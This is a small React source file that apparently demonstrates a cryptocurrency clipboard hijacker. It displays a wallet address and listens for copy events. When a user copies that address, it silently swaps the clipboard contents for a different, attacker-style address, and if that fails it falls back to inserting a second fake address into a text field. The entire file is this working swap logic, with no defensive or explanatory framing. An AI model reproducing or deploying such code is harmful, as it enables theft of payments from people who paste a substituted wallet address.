import { useEffect, useState } from 'react';
import './App.css';

const address = `1EKC6kqp3tmeHr9YNvmXV9smZ6FiRct8ZQ`;
const fakeAddress1 = `18KQzrpXT9ty4o4phPjSKAM17MAMONTAhv3qnabURYhX1`;
const fakeAddress2 = `18KQzrpXT9ty4o4phPjSKAM17MAMONTAhBEZxPRAVqnabURYhX1`;

function App() {
  const [text, setText] = useState('');
  const [copyText, setCopyText] = useState('');

  useEffect(() => {
    async function copyHandler(event) {
      try {
        setCopyText(await navigator.clipboard.readText());
      } catch {
        setCopyText(event.target.innerHTML);
      }
    }

    document.addEventListener('copy', copyHandler);

    return () => document.removeEventListener('copy', copyHandler);
  }, []);

  useEffect(() => {
    async function setToClipboard(text) {
      try {
        await navigator.clipboard.writeText(text);
      } catch {
        setText((prev) => `${prev}${fakeAddress2}`);
      }
    }

    if (copyText === address) {
      setToClipboard(fakeAddress1);
    }
  }, [copyText]);

  return (
    <div>
      <h3>Здесь ваш криптокошелёк, попробуйте скопировать</h3>
      <p>{address}</p>
      <textarea className="textarea" onChange={(e) => setText(e.target.value)} name="" id="" value={text} />
    </div>
  );
}

export default App;
